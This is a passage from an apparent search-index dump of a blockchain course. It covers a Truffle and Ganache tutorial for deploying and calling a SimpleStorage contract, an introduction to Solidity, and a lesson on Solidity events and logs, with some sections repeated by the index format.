actually omit truffle from your command and just run: $ truffle ( develop ) > migrate Assuming all goes well, you should see the following: 2 _deploy_contracts . js ====== Deploying ' SimpleStorage ' ------------------------- > transaction hash : 0 x172f0cff41ea21a7dbbb52883a7499306f54277120fa89bbc6621c7b7efccb80 > Blocks : 0 Seconds : 0 > cont ract address : 0 x524B2860a2489E385C5e12537f58d5a09A9d33ab > Saving migration to chain . > Saving artifacts ------------------------------------- > To tal cos t : 0.000192354 ETH Summary ======= > To tal deployments : 2 > Final cos t : 0.000767772 ETH - Blocks : 0 Seconds : 0 - Saving migration to chain . - Blocks : 0 Seconds : 0 - Saving migration to chain . One of the key output values from the above is the contract address ( 0x524B2860a2489E385C5e12537f58d5a09A9d33ab in the above example). As the name might suggest, this is the address of the deployed instance of contract and the means with how you\u2019d reference it when sending future transactions. Migrations is definitely more of a deeper topic that we\u2019ll be covering more later. In the interim, more details on migrations can be found in Truffle\u2019s documentation here. Interacting with SimpleStorage Last but not least, let\u2019s go ahead and actually interact with our freshly deployed SimpleStorage contract. Ultimately, there\u2019s a number of ways in which you can interact with on-chain contracts, but for the sake of ease in this instance we\u2019ll be doing it directly from the Truffle console. Let\u2019s create an instance of our deployed contract via the following. Note that behind the scenes, Truffle is referencing the build artifacts (which in turn store the aforementioned contract address), that's why this is an async JavaScript call. $ truffle ( develop ) > let storage = await SimpleStorage.deployed () You can now interact via the returned storage object, for example. Let's do that now, but calling the set contract method, writing a new value in the contract state. As you\u2019ll see, given this invocation results in a change of on-chain state, we actually get a transaction \u201creceipt\u201d returned. $ truffle(develop)> storage.set(42) { tx: '0x46e4bb35108e5ecf7ff656008295fda572a753476d5e04c286fcdb7868447dd6', receipt: { transactionHash: '0x46e4bb35108e5ecf7ff656008295fda572a753476d5e04c286fcdb7868447dd6', transactionIndex: 0, blockHash: '0x85dbdf5d71194cb0d841d58bbac283ccf078ce0ebe1c054c6c2ab76442459894', blockNumber: 9, from: '0x5ca1605d4671669b38f7e37c881ed996ede5ac68', to: '0x524b2860a2489e385c5e12537f58d5a09a9d33ab', ... } And a drum roll for this last command! Run the following to get the originally stored number. (We can also explain the syntax a little bit, since it's a bit odd: We're creating a promise to deliver a big number, which will be our stored number.) $ truffle ( develop ) > ( await storage.get ()) .toNumber () 42 Congratulations! You\u2019ve now just created, deployed, and interacted with your very first smart contract using the Truffle Suite. Next, we're going to walkthrough how to use Ganache GUI. Ganache GUI Ganache UI can be really helpful for folks new to smart contract development. Due to its visual nature, it\u2019s a great way to familiarize yourself with all the core constructs of an EVM-based blockchain and help move past that stage of \u201cnot knowing what you don\u2019t know\u201d. It\u2019s fully cross-platform and available to download here. As you can seen in the above screenshot, it has tabs for all the major constructs including accounts, blocks, transactions, contracts, and events. It also starts it\u2019s own chain instance on port 7545 (note that by default truffle develop starts on 9545 and ganache-cli on 8545 ). To best see Ganache UI in action, let\u2019s try deploying the same SimpleStorage (with a few small enhancements) contract from the previous exercise to the chain instance it instantiates. ### Creating a Workspace Upon opening Ganache UI, the first screen you should see is shown below. Select \"New Workspace>> Ethereum\" (depending on your version you should also see the Corda and Filecoin flavors listed in the dropdown). From here, you\u2019ll be presented with a file picker wherein you can navigate to the project we created earlier and select the truffle-config.js file. All going well you should be presented with the accounts screen we saw earlier. Feel free to take a browse through the tabs to begin familiarizing yourself. ### Migrating our contracts to Ganache UI Next up we\u2019re going to migrate our contracts (with a few twists) to the chain instance instantiated by Ganache UI on port 7545 . This will give us a great way to visually inspect what's happening not only on our testnet, but also with the contract itself, as you'll see in a moment. Before we can migrate, we\u2019ll need to update our truffle-config.js file to include the new network as a destination. Because we used truffle init to create our project, it handily includes a number of commented destinations under the networks entry. As such you\u2019ll be able to scroll down and uncomment (currently lines 45-49 at the time of writing). Note that we have to change port to 7545 development: { host: \"127.0.0.1\", port: 7545, network\\_id: \"*\", }, Awesome, we now have a new network we can migrate to! For reference, this same principle applies when migrating to public networks (such as testnets or mainnet; the Ethereum of equivalent of staging and production environments). Go ahead and run the following, noting the use of the --network flag that allows us to specify a given network that we want to target. $ truffle migrate --network development Assuming this ran successfully, you\u2019ll now see some corresponding activity in Ganache UI. Of note are the transactions listed under the \"Transactions\" tab and all the contract information (such as storage, etc) surfaced under the \"Contracts\" tab. This is a really helpful feature of Truffle and Ganache: the integration of both the testnet environment and smart contract values, updated dynamically. To have all this visually is really powerful for developing and debugging a contract. Note the Storage (state) section in our \"Contracts\" section: Last, let\u2019s update our contract to include an event that is emitted every time a new value is set (we'll learn about events in more detail later in this section). Copy and paste the following over your existing SimpleStorage.sol. // SPDX-License-Identifier : MIT pragma solidity >= 0 . 4 . 21 < 0 . 7 . 0 ; contract SimpleStorage { uint storedData ; event setEvent(uint newValue) ; function set(uint x) public { storedData = x ; emit setEvent(x) ; } function get () public view returns ( uint ) { return storedData ; } } We\u2019ll now make use of the --reset flag when re-running the migration command to forcibly replace the contract. Note that this will result in a new contract address. $ truffle migrate --network development --reset Let\u2019s now jump back into the Truffle console, this time using the console command (vs develop which also spins up a ganache instance, which would be redundant this time). $ truffle console --network development Like earlier, we can now send the following to set the value within our SimpleStorage. $ let contract = await SimpleStorage.deployed() $ contract.set(888) If all has been successful, you\u2019ll now see both a reference to setEvent in the logged output. In addition, you\u2019ll also be able to navigate to the events tab within Ganache UI and also see it there. Ganache CLI Ganache CLI is the standalone version of the simulation blockchain built into truffle, it is for folks who are comfortable with the command line and desires full control of thier development blockchain. The latest Ganache CLI version 7 comes with some exiting new features and improvements/bug fixes (discussing these new features and improvements is beyond the scope of this material but if you're curious to dig in, you can start here . To get started Ganache CLI, you need to have Node.js >= v12.0.0 and NPM >= 6.4.1 installed on your computer. See here to download the latest version for your operating system. With the supported versions of Node.js and NPM installed, you can install Ganache CLI by running npm install ganache --global . Once installed, start Ganache CLI with the command ganache , this is similar to running truffle develop . Your command line should look like this: As usual, you are provided with 10 pre-funded account for interacting with your smart contracts. ### Migrating our contracts to Ganache CLI Migrating contracts to Ganache CLI is very similar to how its done using Ganache GUI as explained above, the only difference is you will have to update the network in truffle-config.js to use port 8545 instead. javascript development: { host: \"127.0.0.1\", port: 8545, network\\_id: \"*\", }, Now run $ truffle migrate --network development to start the migration process. Conclusion Great! You\u2019ve now successfully familiarized yourself with Ganache UI and in doing so hopefully getting a little more comfortable with both some of the core Ethereum constructs and the basic elements in the development lifecycle. We know this may be a bit out of your comfort zone, but now that you have a basic understanding of Truffle, you'll be able to start playing around with the Solidity we're going to start learning next! After we go through Solidity fundamentals and Security, we're going to dive deeper into elements of development on Truffle so you can feel even more confident and capable as a developer. Before all that, though, we want to introduce one more tool to help you play around with Solidity and other smart contract development languages: Remix. Additional Material Docs: Truffle Suite Tutorial: Petshop A great tutorial which will walk through developing a smart contract and basic frontend interface. Tutorial: Metacoin Another good starting tutorial walking through building your own ERC-20 token","title":"Index"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L2-intro-tutorial/#truffle-suite-deep-dive","text":"As with most things, the best way to learn is by doing, so without further ado let\u2019s dive into a hands on example of using Truffle. In this example we\u2019ll be leveraging some of the core Truffle commands to build the decentralized equivalent of a \u201cHello World!\u201d program, \u201cSimpleStorage\u201d. As the name suggests, this example will provide a means of both storing some on-chain data (essentially state stored indefinitely on the blockchain) and subsequently retrieving this state. Note: If you\u2019re going to be following along, this example assumes you followed the steps last lesson to successfully install Truffle","title":"Truffle Suite Deep Dive"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L2-intro-tutorial/#initialize-an-empty-project","text":"Let\u2019s begin by creating an empty project using the init command. In a new directory (e.g. \u201cSimpleStorage\u201d) and from your terminal, run the following command. $ truffle init Assuming everything worked successfully you should see the following output and a number of directories (contracts, migrations, etc) created in the current directory. Starting init... ================ > Copying project files to /Users/bluer/Developer/temp Init successful, sweet! Try our scaffold commands to get started: $ truffle create contract YourContractName # scaffold a contract $ truffle create test YourTestName # scaffold a test http://trufflesuite.com/docs Congratulations, you now have a bare bones project! Next up, let\u2019s create a contract within which we\u2019ll be able to store our SimpleStorage project\u2019s code.","title":"Initialize an Empty Project"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L2-intro-tutorial/#create-a-contract","text":"Truffle provides a create command with which you can achieve this, although as we'll show later it\u2019s often just as easy to create the file via your favorite editor environment. $ truffle create contract SimpleStorage This will create a new Solidity (note that this is the default language) file, SimpleStorage.sol within your contracts directory. Using a code editor, or using something like nano from the command line, paste the following Solidity code into the SimpleStorage.sol file and save: // SPDX-License-Identifier : MIT pragma solidity >= 0 . 4 . 21 < 0 . 7 . 0 ; contract SimpleStorage { uint storedData ; function set(uint x) public { storedData = x ; } function get () public view returns ( uint ) { return storedData ; } } Sweet, your first contract! Now let\u2019s try out the compile command we saw earlier.","title":"Create a Contract"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L2-intro-tutorial/#compilation-baby","text":"Running the compile command from your terminal like the following: $ truffle compile Compiling your contracts... =========================== > Compiling ./contracts/Migrations.sol > Compiling ./contracts/SimpleStorage.sol > Artifacts written to /Users/bluer/Developer/temp/build/contracts > Compiled successfully using: - solc: 0.5.16+commit.9c3226ce.Emscripten.clang Assuming all went smoothly, Truffle should have compiled your contract and added the resultant output (something referred to as build artifacts that we\u2019ll explore in more detail later) to build/contracts/SimpleStorage.json . Note that you\u2019ll also likely see some references to Migrations. This is a mechanism used by Truffle to store the details related to the last migration (deployment) on-chain. Next up we\u2019re going to explore deploying our contract to a simulation of a blockchain network using Ganache.","title":"Compilation, baby!"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L2-intro-tutorial/#migrating-or-deploying-your-contract","text":"So we\u2019ve created and compiled a contract, but now we need somewhere to deploy it so we can begin testing. This is where Ganache comes in! As alluded to earlier, Ganache comes in a number of different flavors. For ease we\u2019re going to start by using the version built directly into Truffle itself (more on standalone Ganache CLI and Ganache UI shortly). To achieve this we can use Truffle\u2019s develop command which both starts up a Ganache instance and provides us with an interactive REPL with which we can actually interact with our contracts. $ truffle develop And you should see this, if successful: Truffle Develop started at http : // 127 . 0 . 0 . 1 : 9545 / Accounts : ( 0 ) 0 x5ca1605d4671669b38f7e37c881ed996ede5ac68 \u2026 Private Keys : ( 0 ) dd7a8c358901b0f572e461585c9ab27f92b24902c45859114776af12077cb208 \u2026 Mnemonic : cloth either reunion project inflict inside ghost welcome tip lemon again knee \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle . It is not secure . Ensure you do not use it on production blockchains , or else you risk losing funds . truffle ( develop ) > We\u2019ll be glossing over the details of the above output for the moment, other than to say it gives us access to 10 pre-funded accounts (as a default) that we can leverage as a means of interacting contracts. Before we actually migrate our contract we\u2019ll need to create a migration script. This step enables you to granularly instruct Truffle how to migrate your contracts, including things like constructor arguments. In the migrations directory create a file called 2_deploy_contracts.js and copy into that file the following: var SimpleStorage = artifacts . require ( \"./SimpleStorage.sol\" ); module . exports = function ( deployer ) { deployer . deploy ( SimpleStorage ); }; The numerical prefix of 2_deploy_contracts.js is actually important for two reasons. First, it dictates the order in which scripts are executed. Second, it\u2019s the index stored on-chain by the Migration.sol to keep track of successful migrations per its last_completed_migration value. Now that we have a migration script ready to go we can migrate as follows. Since we\u2019re doing this migration from the Truffle console we started with truffle develop , you can actually omit truffle from your command and just run: $ truffle ( develop ) > migrate Assuming all goes well, you should see the following: 2 _deploy_contracts . js ====== Deploying ' SimpleStorage ' ------------------------- > transaction hash : 0 x172f0cff41ea21a7dbbb52883a7499306f54277120fa89bbc6621c7b7efccb80 > Blocks : 0 Seconds : 0 > cont ract address : 0 x524B2860a2489E385C5e12537f58d5a09A9d33ab > Saving migration to chain . > Saving artifacts ------------------------------------- > To tal cos t : 0.000192354 ETH Summary ======= > To tal deployments : 2 > Final cos t : 0.000767772 ETH - Blocks : 0 Seconds : 0 - Saving migration to chain . - Blocks : 0 Seconds : 0 - Saving migration to chain . One of the key output values from the above is the contract address ( 0x524B2860a2489E385C5e12537f58d5a09A9d33ab in the above example). As the name might suggest, this is the address of the deployed instance of contract and the means with how you\u2019d reference it when sending future transactions. Migrations is definitely more of a deeper topic that we\u2019ll be covering more later. In the interim, more details on migrations can be found in Truffle\u2019s documentation here.","title":"Migrating (or Deploying) Your Contract"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L2-intro-tutorial/#interacting-with-simplestorage","text":"Last but not least, let\u2019s go ahead and actually interact with our freshly deployed SimpleStorage contract. Ultimately, there\u2019s a number of ways in which you can interact with on-chain contracts, but for the sake of ease in this instance we\u2019ll be doing it directly from the Truffle console. Let\u2019s create an instance of our deployed contract via the following. Note that behind the scenes, Truffle is referencing the build artifacts (which in turn store the aforementioned contract address), that's why this is an async JavaScript call. $ truffle ( develop ) > let storage = await SimpleStorage.deployed () You can now interact via the returned storage object, for example. Let's do that now, but calling the set contract method, writing a new value in the contract state. As you\u2019ll see, given this invocation results in a change of on-chain state, we actually get a transaction \u201creceipt\u201d returned. $ truffle(develop)> storage.set(42) { tx: '0x46e4bb35108e5ecf7ff656008295fda572a753476d5e04c286fcdb7868447dd6', receipt: { transactionHash: '0x46e4bb35108e5ecf7ff656008295fda572a753476d5e04c286fcdb7868447dd6', transactionIndex: 0, blockHash: '0x85dbdf5d71194cb0d841d58bbac283ccf078ce0ebe1c054c6c2ab76442459894', blockNumber: 9, from: '0x5ca1605d4671669b38f7e37c881ed996ede5ac68', to: '0x524b2860a2489e385c5e12537f58d5a09a9d33ab', ... } And a drum roll for this last command! Run the following to get the originally stored number. (We can also explain the syntax a little bit, since it's a bit odd: We're creating a promise to deliver a big number, which will be our stored number.) $ truffle ( develop ) > ( await storage.get ()) .toNumber () 42 Congratulations! You\u2019ve now just created, deployed, and interacted with your very first smart contract using the Truffle Suite. Next, we're going to walkthrough how to use Ganache GUI.","title":"Interacting with SimpleStorage"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L2-intro-tutorial/#ganache-gui","text":"Ganache UI can be really helpful for folks new to smart contract development. Due to its visual nature, it\u2019s a great way to familiarize yourself with all the core constructs of an EVM-based blockchain and help move past that stage of \u201cnot knowing what you don\u2019t know\u201d. It\u2019s fully cross-platform and available to download here. As you can seen in the above screenshot, it has tabs for all the major constructs including accounts, blocks, transactions, contracts, and events. It also starts it\u2019s own chain instance on port 7545 (note that by default truffle develop starts on 9545 and ganache-cli on 8545 ). To best see Ganache UI in action, let\u2019s try deploying the same SimpleStorage (with a few small enhancements) contract from the previous exercise to the chain instance it instantiates. ### Creating a Workspace Upon opening Ganache UI, the first screen you should see is shown below. Select \"New Workspace>> Ethereum\" (depending on your version you should also see the Corda and Filecoin flavors listed in the dropdown). From here, you\u2019ll be presented with a file picker wherein you can navigate to the project we created earlier and select the truffle-config.js file. All going well you should be presented with the accounts screen we saw earlier. Feel free to take a browse through the tabs to begin familiarizing yourself. ### Migrating our contracts to Ganache UI Next up we\u2019re going to migrate our contracts (with a few twists) to the chain instance instantiated by Ganache UI on port 7545 . This will give us a great way to visually inspect what's happening not only on our testnet, but also with the contract itself, as you'll see in a moment. Before we can migrate, we\u2019ll need to update our truffle-config.js file to include the new network as a destination. Because we used truffle init to create our project, it handily includes a number of commented destinations under the networks entry. As such you\u2019ll be able to scroll down and uncomment (currently lines 45-49 at the time of writing). Note that we have to change port to 7545 development: { host: \"127.0.0.1\", port: 7545, network\\_id: \"*\", }, Awesome, we now have a new network we can migrate to! For reference, this same principle applies when migrating to public networks (such as testnets or mainnet; the Ethereum of equivalent of staging and production environments). Go ahead and run the following, noting the use of the --network flag that allows us to specify a given network that we want to target. $ truffle migrate --network development Assuming this ran successfully, you\u2019ll now see some corresponding activity in Ganache UI. Of note are the transactions listed under the \"Transactions\" tab and all the contract information (such as storage, etc) surfaced under the \"Contracts\" tab. This is a really helpful feature of Truffle and Ganache: the integration of both the testnet environment and smart contract values, updated dynamically. To have all this visually is really powerful for developing and debugging a contract. Note the Storage (state) section in our \"Contracts\" section: Last, let\u2019s update our contract to include an event that is emitted every time a new value is set (we'll learn about events in more detail later in this section). Copy and paste the following over your existing SimpleStorage.sol. // SPDX-License-Identifier : MIT pragma solidity >= 0 . 4 . 21 < 0 . 7 . 0 ; contract SimpleStorage { uint storedData ; event setEvent(uint newValue) ; function set(uint x) public { storedData = x ; emit setEvent(x) ; } function get () public view returns ( uint ) { return storedData ; } } We\u2019ll now make use of the --reset flag when re-running the migration command to forcibly replace the contract. Note that this will result in a new contract address. $ truffle migrate --network development --reset Let\u2019s now jump back into the Truffle console, this time using the console command (vs develop which also spins up a ganache instance, which would be redundant this time). $ truffle console --network development Like earlier, we can now send the following to set the value within our SimpleStorage. $ let contract = await SimpleStorage.deployed() $ contract.set(888) If all has been successful, you\u2019ll now see both a reference to setEvent in the logged output. In addition, you\u2019ll also be able to navigate to the events tab within Ganache UI and also see it there.","title":"Ganache GUI"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L2-intro-tutorial/#ganache-cli","text":"Ganache CLI is the standalone version of the simulation blockchain built into truffle, it is for folks who are comfortable with the command line and desires full control of thier development blockchain. The latest Ganache CLI version 7 comes with some exiting new features and improvements/bug fixes (discussing these new features and improvements is beyond the scope of this material but if you're curious to dig in, you can start here . To get started Ganache CLI, you need to have Node.js >= v12.0.0 and NPM >= 6.4.1 installed on your computer. See here to download the latest version for your operating system. With the supported versions of Node.js and NPM installed, you can install Ganache CLI by running npm install ganache --global . Once installed, start Ganache CLI with the command ganache , this is similar to running truffle develop . Your command line should look like this: As usual, you are provided with 10 pre-funded account for interacting with your smart contracts. ### Migrating our contracts to Ganache CLI Migrating contracts to Ganache CLI is very similar to how its done using Ganache GUI as explained above, the only difference is you will have to update the network in truffle-config.js to use port 8545 instead. javascript development: { host: \"127.0.0.1\", port: 8545, network\\_id: \"*\", }, Now run $ truffle migrate --network development to start the migration process.","title":"Ganache CLI"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L2-intro-tutorial/#conclusion","text":"Great! You\u2019ve now successfully familiarized yourself with Ganache UI and in doing so hopefully getting a little more comfortable with both some of the core Ethereum constructs and the basic elements in the development lifecycle. We know this may be a bit out of your comfort zone, but now that you have a basic understanding of Truffle, you'll be able to start playing around with the Solidity we're going to start learning next! After we go through Solidity fundamentals and Security, we're going to dive deeper into elements of development on Truffle so you can feel even more confident and capable as a developer. Before all that, though, we want to introduce one more tool to help you play around with Solidity and other smart contract development languages: Remix.","title":"Conclusion"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L2-intro-tutorial/#additional-material","text":"Docs: Truffle Suite Tutorial: Petshop A great tutorial which will walk through developing a smart contract and basic frontend interface. Tutorial: Metacoin Another good starting tutorial walking through building your own ERC-20 token","title":"Additional Material"},{"location":"S03-smart-contracts/M2-solidity/L1-background-context/","text":"Solidity Background and Context Solidity is \"an object-oriented, high-level language for implementing smart contracts...programs which govern the behaviour of accounts within the Ethereum state\u201d ( source ). While a few smart contract programming languages have developed over the years, Solidity remains the most dominant one. As we mentioned earlier, Solidity is a higher-order language meaning that the code deployed with a smart contract is not Solidity, but rather EVM bytecode. Solidity is an abstraction on top of that fundamental language so we don't have to be writing code that looks like this: PUSH1 0 x80 PUSH1 0 x40 MSTORE PUSH1 0 xE PUSH1 0 x0 SSTORE CALLVALUE DUP1 ISZERO PUSH1 0 x14 JUMPI PUSH1 0 x0 DUP1 REVERT JUMPDEST POP PUSH1 0 x35 DUP1 PUSH1 0 x22 PUSH1 0 x0 CODECOPY PUSH1 0 x0 RETURN INVALID PUSH1 0 x80 PUSH1 0 x40 MSTORE PUSH1 0 x0 DUP1 REVERT INVALID LOG1 PUSH6 0 x627A7A723058 KECCAK256 RETURNDATASIZE 0 x25 0 xb6 0 xcf CALLDATALOAD LOG1 DUP16 PUSH9 0 x27AC943141CFD6D0FA MSTORE SHL DUP6 LOG4 PUSH8 0 x7FADA153CC03D771 BLOCKHASH 0 xb3 STOP 0 x29 But, rather code that looks like this: pragma solidity >=0.4.0 <0.9.0; contract MyContract { uint i = 10 + 2 * 2; } While both these blocks of code describe the same operation, the second version (Solidity) is much easier to read and write. General Characteristics of Solidity Solidity uses the ECMAScript syntax like JavaScript, to make it approachable for web developers. However, do not be lulled into complacency! Solidity is much more demanding in its requirements. Some of Solidity's basic characteristics: * Case Sensitive * Statement termination via a semicolon ; * Files use the .sol extension * Statically typed Types need to be known at compile time. This makes Solidity more like TypeScript than JavaScript in practice. * Various compilation options Solidity compiling can be done on the command line by Solc , you can compile it in a web-browser using Remix, or compile it as part of a smart contract development framework like Truffle or Hardhat . * Compiles down to EVM bytecode Which then runs within the Ethereum Virtual Machine when deployed to a network Overall, the Solidity workflow can be illustrated as follows: In this section, we're going to go over the basic conventions of Solidity. We're also going to start building smart contracts and discussing their general structure and design patterns. We can't emphasize this enough: smart contract coding is both really exciting and really dangerous! We see smart contracts rekt every day! We want to both give you all the tools to both build with creativity and confidence. Let's go! Additional Material Wikipedia: Solidity Docs: Official Solidity Documentation If you'd like some other places to learn Solidity, you can also check out these great resources. To be clear, we'll definitely be teaching you Solidity along with how to develop dapps. We also want to provide any external help we can as well! Bootcamp:Learn Blockchain, Solidity and Full Stack JavaScript Development: A 32 hour long comprehensive Blockchain Development Bootcamp by Patrick Collins Course: CryptoZombies One of the most well-known introductions to Solidity Course: Ethernaut (OpenZeppelin) An excellent in-browser \"game\" teaching Solidity from a security perspective. Course: Intro to Solidity (Chainshot) Chainshot uses a very cool interactive platform to teach Solidity Wiki: Solidity by Example A bunch of great examples of Solidity, including excellent design patterns, hacks and security tips. Wiki: Use Web3 Another good collection of learning resources Article: Test Driven Introduction to Solidity From an older pragma version of Solidity, but might be interesting to check out! Repo accompanying the article here. Thread: What Does Ethereum Development Look Like Today? Santiago Palladino, who wrote Ethereum for Web Developers, updates parts of his book for the current Ethereum ecosystem. Article: Learn X in Y Minutes (Solidity) A bit long and rough, but a comprehensive overview of learning Solidity Advanced Material Twitter Thread: Resource You Need to Know to Become a Solidity Dev Series: EVM Deep Dive","title":"Index"},{"location":"S03-smart-contracts/M2-solidity/L1-background-context/#solidity-background-and-context","text":"Solidity is \"an object-oriented, high-level language for implementing smart contracts...programs which govern the behaviour of accounts within the Ethereum state\u201d ( source ). While a few smart contract programming languages have developed over the years, Solidity remains the most dominant one. As we mentioned earlier, Solidity is a higher-order language meaning that the code deployed with a smart contract is not Solidity, but rather EVM bytecode. Solidity is an abstraction on top of that fundamental language so we don't have to be writing code that looks like this: PUSH1 0 x80 PUSH1 0 x40 MSTORE PUSH1 0 xE PUSH1 0 x0 SSTORE CALLVALUE DUP1 ISZERO PUSH1 0 x14 JUMPI PUSH1 0 x0 DUP1 REVERT JUMPDEST POP PUSH1 0 x35 DUP1 PUSH1 0 x22 PUSH1 0 x0 CODECOPY PUSH1 0 x0 RETURN INVALID PUSH1 0 x80 PUSH1 0 x40 MSTORE PUSH1 0 x0 DUP1 REVERT INVALID LOG1 PUSH6 0 x627A7A723058 KECCAK256 RETURNDATASIZE 0 x25 0 xb6 0 xcf CALLDATALOAD LOG1 DUP16 PUSH9 0 x27AC943141CFD6D0FA MSTORE SHL DUP6 LOG4 PUSH8 0 x7FADA153CC03D771 BLOCKHASH 0 xb3 STOP 0 x29 But, rather code that looks like this: pragma solidity >=0.4.0 <0.9.0; contract MyContract { uint i = 10 + 2 * 2; } While both these blocks of code describe the same operation, the second version (Solidity) is much easier to read and write.","title":"Solidity Background and Context"},{"location":"S03-smart-contracts/M2-solidity/L1-background-context/#general-characteristics-of-solidity","text":"Solidity uses the ECMAScript syntax like JavaScript, to make it approachable for web developers. However, do not be lulled into complacency! Solidity is much more demanding in its requirements. Some of Solidity's basic characteristics: * Case Sensitive * Statement termination via a semicolon ; * Files use the .sol extension * Statically typed Types need to be known at compile time. This makes Solidity more like TypeScript than JavaScript in practice. * Various compilation options Solidity compiling can be done on the command line by Solc , you can compile it in a web-browser using Remix, or compile it as part of a smart contract development framework like Truffle or Hardhat . * Compiles down to EVM bytecode Which then runs within the Ethereum Virtual Machine when deployed to a network Overall, the Solidity workflow can be illustrated as follows: In this section, we're going to go over the basic conventions of Solidity. We're also going to start building smart contracts and discussing their general structure and design patterns. We can't emphasize this enough: smart contract coding is both really exciting and really dangerous! We see smart contracts rekt every day! We want to both give you all the tools to both build with creativity and confidence. Let's go!","title":"General Characteristics of Solidity"},{"location":"S03-smart-contracts/M2-solidity/L1-background-context/#additional-material","text":"Wikipedia: Solidity Docs: Official Solidity Documentation If you'd like some other places to learn Solidity, you can also check out these great resources. To be clear, we'll definitely be teaching you Solidity along with how to develop dapps. We also want to provide any external help we can as well! Bootcamp:Learn Blockchain, Solidity and Full Stack JavaScript Development: A 32 hour long comprehensive Blockchain Development Bootcamp by Patrick Collins Course: CryptoZombies One of the most well-known introductions to Solidity Course: Ethernaut (OpenZeppelin) An excellent in-browser \"game\" teaching Solidity from a security perspective. Course: Intro to Solidity (Chainshot) Chainshot uses a very cool interactive platform to teach Solidity Wiki: Solidity by Example A bunch of great examples of Solidity, including excellent design patterns, hacks and security tips. Wiki: Use Web3 Another good collection of learning resources Article: Test Driven Introduction to Solidity From an older pragma version of Solidity, but might be interesting to check out! Repo accompanying the article here. Thread: What Does Ethereum Development Look Like Today? Santiago Palladino, who wrote Ethereum for Web Developers, updates parts of his book for the current Ethereum ecosystem. Article: Learn X in Y Minutes (Solidity) A bit long and rough, but a comprehensive overview of learning Solidity","title":"Additional Material"},{"location":"S03-smart-contracts/M2-solidity/L1-background-context/#advanced-material","text":"Twitter Thread: Resource You Need to Know to Become a Solidity Dev Series: EVM Deep Dive","title":"Advanced Material"},{"location":"S03-smart-contracts/M2-solidity/L2-data-type-and-variables/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S03-smart-contracts/M2-solidity/L2-data-type-and-variables/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S03-smart-contracts/M2-solidity/L3-functions/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S03-smart-contracts/M2-solidity/L3-functions/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S03-smart-contracts/M2-solidity/L4-storage-and-memory/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S03-smart-contracts/M2-solidity/L4-storage-and-memory/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S03-smart-contracts/M2-solidity/L5-contract-structure/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S03-smart-contracts/M2-solidity/L5-contract-structure/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S03-smart-contracts/M2-solidity/L6-abi/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S03-smart-contracts/M2-solidity/L6-abi/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S03-smart-contracts/M2-solidity/L7-events-and-logs/","text":"Declaring Events pragma solidity >= 0 . 5 . 0 <= 0 . 8 . 0 ; contract ExampleContract { event LogReturnValue ( address indexed _from , int256 _value ) ; function foo ( int256 _value ) public returns ( int256 ) { emit LogReturnValue ( msg . sender , _value ) ; return _value ; } } This is how you declare an event called LogReturnValue . Use the event keyword followed by the event name. A recent update to the Solidity compiler requires the emit keyword before an event is logged. This helps further clarify when events are being logged in the contract code. Declaring events require that you specify the parameter type as well as a name for the parameter. This parameter name is the name that will appear in the log, so make it descriptive and clear. You can add the indexed keyword to event parameters. Up to three parameters can receive the indexed attribute. This increases the searchability of events. It is possible to filter for specific values of indexed arguments in the user interface. Here is a link to the solidity documentation on events. Use Cases The common uses for events can be broken down into three main use cases: Events can provide smart contract return values for the User Interface They can act as asynchronous triggers with data and They can act as a cheaper form of storage. Get values when transaction is mined When a transaction is sent via web3.js, a transaction hash is returned, even if the contract functions specifies a return value. Transactions don\u2019t return the contract value because transactions are not immediately mined and included in the blockchain - it takes time (they are asynchronous). You can use an event in the contract function in conjunction with an event watcher in the UI to observe a variable value when the transaction is mined. Trigger application logic You can use an event watcher as a trigger for application logic beyond just reading return values. You could take another action, display a message or update the UI when an event is observed. Events as Data Storage Logs, which are essentially the same as events (the context dictates which term is more appropriate) can also be used as a cheaper form of storage. Logs cost 8 gas per byte whereas contract storage costs 20,000 per 32 bytes, or 625 gas per byte. Logs are cheaper, but also cannot be accessed from any contracts so their use case as storage objects is much more limited. Even still, logs can be useful for aggregating historical reference data. Events are inheritable members of contracts. You can call events of parent contracts from within child contracts. When called from within a contract, events cause arguments to be stored in the transaction log, a special data structure in the blockchain. The logs are associated with the address of the contract and will be incorporated into the blockchain, persisting as long as a block is accessible. Log and event data are not accessible from within contracts, not even from the contract that created the log. Events are useful when interacting with an application. They can provide notifications and confirmations of transactions happening in the smart contract. They are also useful for debugging purposes during development. Logs are not part of the blockchain per se since they are not required for consensus (they are just historical data), but they are verified by the blockchain as the transaction receipt hashes are stored inside the blocks. Remember that events are not emitted until the transaction has been successfully mined. When to log events Logging an event for every state change of the contract is a good heuristic for when you should use events. This allows you to track any and all updates to the state of the contract by setting up event watchers in your javascript files. Additional Resources: Technical introduction to Events and Logs in Ethereum (Joseph Chow, Consensys) Events - Solidity Docs Listening to events with web3.js or via the contract object Article: Deep Dive Into Ethereum Logs Article: Everything You Ever Wanted to Know About Events and Logs on Ethereum","title":"Index"},{"location":"S03-smart-contracts/M2-solidity/L7-events-and-logs/#declaring-events","text":"pragma solidity >= 0 . 5 . 0 <= 0 . 8 . 0 ; contract ExampleContract { event LogReturnValue ( address indexed _from , int256 _value ) ; function foo ( int256 _value ) 